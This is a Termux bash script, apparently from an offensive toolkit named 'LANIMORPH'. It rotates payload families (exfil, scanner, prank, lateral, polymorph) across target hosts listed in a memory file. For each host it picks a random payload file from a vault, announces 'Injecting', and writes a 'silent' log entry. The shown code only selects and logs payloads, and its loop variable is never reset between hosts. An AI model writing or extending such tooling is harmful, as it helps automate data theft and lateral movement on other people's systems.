#!/data/data/com.termux/files/usr/bin/bash
mem="$HOME/LANIMORPH/chain/mutation_memory.db"
vault="$HOME/LANIMORPH/vault"
families=(exfil scanner prank lateral polymorph)

echo -e "\n♻️  LANIMORPH :: Smart Mutation Rotator\n"

while read -r line; do
    host=$(echo "$line" | cut -d':' -f1)
    [[ "$host" == "" ]] && continue

    used=($(echo "$line" | cut -d':' -f2 | tr ',' ' '))

    for fam in "${families[@]}"; do
        if [[ ! " ${used[*]} " =~ " $fam " ]]; then
            next="$fam"
            break
        fi
    done

    if [[ -z "$next" ]]; then
        echo "[✘] $host — All families already used. Skipping."
        continue
    fi

    # Random payload from that family
    payload=$(find "$vault" -type f -iname "*$next*" | shuf -n1)
    if [[ -z "$payload" ]]; then
        echo "[✘] No payload found for family $next. Skipping $host."
        continue
    fi

    echo "[~] Injecting to $host → family [$next] using $(basename "$payload")"
    echo "[smart: $(date +'%b %d %H:%M')] silent: Host mutated by self [$host] using $payload" >> "$HOME/LANIMORPH/logs/inject_silent.log"

done < "$mem"

echo -e "\n[✓] Smart mutation rotation complete.\n"
